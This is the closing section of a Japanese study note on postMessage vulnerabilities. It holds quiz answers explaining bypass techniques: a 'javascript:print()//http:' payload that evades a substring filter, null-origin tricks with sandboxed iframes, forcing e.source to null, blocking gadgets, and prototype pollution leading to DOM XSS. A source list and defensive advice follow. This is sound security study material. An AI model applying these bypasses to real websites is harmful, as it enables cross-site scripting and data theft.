   ▶ 答え: `event.isTrusted` は「ブラウザがディスパッチしたイベントか（JS の `dispatchEvent` ではないか）」を示すだけで、`MessageEvent` が信頼できるオリジンや真正なユーザー操作から来たことを証明しない。認可には `event.origin`（必要なら `event.source`）を使う。

4. `javascript:print()//http:` というペイロードは、なぜ `indexOf('http:')` フィルタを通過しつつ JavaScript を実行できるのか。
   ▶ 答え: 先頭が `javascript:print()` なのでブラウザは受信側オリジンで JavaScript URL を実行する。`//http:` は JavaScript の行コメントなので実行されないが、文字列としては `http:` を含むので `indexOf('http:') > -1` フィルタを満たす。

5. サンドボックス iframe を使うと `e.origin == window.origin` チェックがなぜ通ってしまうのか。
   ▶ 答え: `allow-same-origin` を欠くサンドボックス iframe の文書は opaque origin を持ち、origin が `null` になる。`allow-popups`（かつ `allow-popups-to-escape-sandbox` 無し）で開いたポップアップもサンドボックスを継承して origin が `null` になる。両方 `null` なので `null == null` が真になり、チェックを通過する。

6. `e.source` を `null` に強制するにはどうするか。それは何のチェックを崩すか。
   ▶ 答え: `postMessage` を送る iframe を作り、送信直後にその iframe を削除する。すると受信側から見た `e.source` が `null` になる。これで `e.source !== window` や `e.source == window.calc.contentWindow` のような送信元ウィンドウの一致チェックが崩れる。

7. 「信頼した partner オリジンは境界にならない」とはどういう意味か。
   ▶ 答え: 受信側が `event.origin === "https://partner.com"` だけを安全と仮定していても、`partner.com` 側に XSS が1つでもあれば、そこを踏み台にして許可済みメッセージを親へ送れてしまう。origin の信頼だけでは不十分で、受信データの形式検証とシンクの無害化が必要。

8. メインページをブロックして子 iframe への postMessage を奪うレースで、「ブロッキングガジェット」とは何か。例を1つ挙げよ。
   ▶ 答え: 親の `message` ハンドラから到達できる、時間のかかる同期処理のこと。例として、`==` の型強制で大きな `Uint8Array`/`ArrayBuffer` を文字列化させる、あるいは `for (let i = 0; i < e.data.slow; i++) {}` のような攻撃者制御長のループがある。親が忙しい隙に子へ先回りしてペイロードを仕込む。

9. `postMessage` から DOM XSS へ至る Prototype Pollution 連鎖の流れを説明せよ。
   ▶ 答え: `{"__proto__":{...}}` のペイロードを iframe へ送ってプロトタイプを汚染し、汚染した値に `onerror` 付き `<img>` などを埋め込む。その後 `"refresh"` などで再描画をトリガーすると、汚染値がテンプレートに反映されて XSS が発火する。

10. 受信側の防御を3段構えで述べよ。
    ▶ 答え: (1) 他サイトからのメッセージが不要なら `message` リスナーを一切登録しない。(2) 必要なら `origin`（必要なら `source`）を FQDN 完全一致で検証する。(3) さらに受信データの構文（形式）を検証し、`innerHTML`/`eval` へ無検証で流さず `textContent` を使う。

---

## 出典

- HackTricks — PostMessage Vulnerabilities: https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html （GitHub raw 原文 `raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/postmessage-vulnerabilities/README.md` から取得）
- HackTricks 子ページ — Bypassing SOP with Iframes 1 / 2、Blocking the Main Page to Steal a postMessage、Stealing postMessage Data by Navigating an Iframe（同ディレクトリ GitHub raw から取得）
- MDN — Window: postMessage() method: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage （`raw.githubusercontent.com/mdn/content` から取得）
- MDN — Event.isTrusted: https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted
- OWASP — HTML5 Security Cheat Sheet（Web Messaging）: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging （`raw.githubusercontent.com/OWASP/CheatSheetSeries` から取得）
- terjanq — same-origin-xss（soXSS writeup）: https://github.com/terjanq/same-origin-xss
- Posta（enso.security）: https://github.com/benso-io/posta
- postMessage-tracker（Frans Rosén）: https://github.com/fransr/postMessage-tracker
- eventlistener-xss-recon（yavolo）: https://github.com/yavolo/eventlistener-xss-recon
- v8-randomness-predictor（PwnFunction）: https://github.com/PwnFunction/v8-randomness-predictor
- jlajara — DOM XSS via postMessage 2: https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html
- PortSwigger Lab — DOM XSS using web messages and a JavaScript URL: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url
- ysamm — leaking-fbevents-ato: https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html
- ysamm — capig-xss: https://ysamm.com/uncategorized/2025/01/13/capig-xss.html
- ysamm — self-xss-facebook-payments: https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html
- ysamm — math-random-facebook-sdk: https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html

<!-- self-read: https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html | 本体ホストが egress 403。原文テキストは GitHub raw から取得したが、getEventListeners と Event Listeners のスクリーンショット2枚は画像のため未収録 -->
<!-- self-read: https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html | jlajara.gitlab.io が egress 403、GitHub ミラー無し、WebSearch 予算枯渇で二次情報でも未回収 -->
<!-- self-read: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url | portswigger.net が egress 403。手法は本文に収録済みだが実ラボは自分で開く -->
<!-- self-read: https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html | ysamm.com が egress 403、個人ブログでミラー無し。4記事の技術核は本文に転載済みだが報奨金・タイムライン・完全なキー名は原典参照 -->

<!-- sources: https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html, https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage, https://developer.mozilla.org/en-US/docs/Web/API/Event/isTrusted, https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#web-messaging, https://github.com/terjanq/same-origin-xss, https://github.com/benso-io/posta, https://github.com/fransr/postMessage-tracker, https://github.com/yavolo/eventlistener-xss-recon, https://github.com/PwnFunction/v8-randomness-predictor, https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html, https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url, https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html, https://ysamm.com/uncategorized/2025/01/13/capig-xss.html, https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html, https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html -->
<!-- terms: postMessage, targetOrigin, 同一オリジンポリシー, オリジン, addEventListener, message イベント, event.origin, event.source, event.isTrusted, MessageEvent, DOM ベース XSS, Prototype Pollution, DOM クロバリング, サンドボックス iframe, opaque origin, null origin, 転送可能オブジェクト, DOMPurify, frame-ancestors, X-Frame-Options, targetOrigin ワイルドカード, substring scheme チェック, javascript URL, リレーページ, 信頼オリジン allowlist, ブロッキングガジェット, Math.random 予測, xorshift128+, Posta, postMessage-tracker -->
